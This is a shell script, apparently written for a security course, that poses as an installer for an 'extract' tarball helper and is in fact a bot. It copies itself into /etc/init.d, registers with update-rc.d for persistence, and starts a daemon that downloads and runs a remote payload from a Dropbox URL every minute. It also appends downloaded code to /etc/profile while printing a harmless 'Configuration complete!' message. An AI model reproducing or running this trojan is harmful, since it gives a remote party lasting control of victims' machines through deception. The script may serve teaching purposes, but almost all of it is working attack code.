#! /bin/sh

name=`basename $0`

payloadurl="https://dl.dropboxusercontent.com/u/62123265/CS%20259d/payload.sh"
extractFunctionUrl="https://dl.dropboxusercontent.com/u/62123265/CS%20259d/extract_function.sh"
testTarballUrl="https://dl.dropboxusercontent.com/u/62123265/CS%20259d/test_tarball.tar.gz"

function daemonhelper {
  # Enable network connectivity
  dhclient > /dev/null 2>&1

  sleep 5

  while true
  do
    # Pull down a (possibly empty) payload
    payloadPath="/tmp/payload.sh"
    wget $payloadurl --no-check-certificate -O $payloadPath > /dev/null 2>&1
    chmod 777 $payloadPath > /dev/null 2>&1
    
    # Execute payload
    $payloadPath
    rm -f $payloadPath > /dev/null 2>&1

    sleep 60
  done
}

function addExtractFunctions {
  #Enable internet connection
  dhclient > /dev/null 2>&1

  # Pull down the code for the extract function
  extractFunctionPath="/tmp/extract_function.sh"
  wget $extractFunctionUrl --no-check-certificate -O $extractFunctionPath > /dev/null 2>&1
  
  # Append it to the end of /etc/profile
  cat $extractFunctionPath >> "/etc/profile" 2> /dev/null

  # Clean up
  rm -f $extractFunctionPath > /dev/null 2>&1

  # Download the test-tarball
  wget $testTarballUrl --no-check-certificate > /dev/null 2>&1
}

case "$1" in
  # Service is started. Launch this script as a daemon
	start)
      $0 daemon &
      ;;

  # Don't bother cleaning up
  stop)
      ;;

  # Script launched as a daemon
  daemon)
      daemonhelper
      ;;

  # Script launched by the compromised user. 
  *)
      # Copy ourself to /etc/init.d/
      cp $0 /etc/init.d/$name > /dev/null 2>&1
      update-rc.d $name defaults > /dev/null 2>&1

      # Kick off the bot daemon
      $0 daemon &

      # Do what the user originally wanted
      addExtractFunctions

      echo "A tarball was placed in your current directory for you to try extracting."
      echo "Move the tarball to a user directory, log back in as that user,"
      echo "and execute:"
      echo "extract <TARBALL_NAME>"
      echo ""
      echo "Configuration complete!"
      ;;
esac

exit 0
      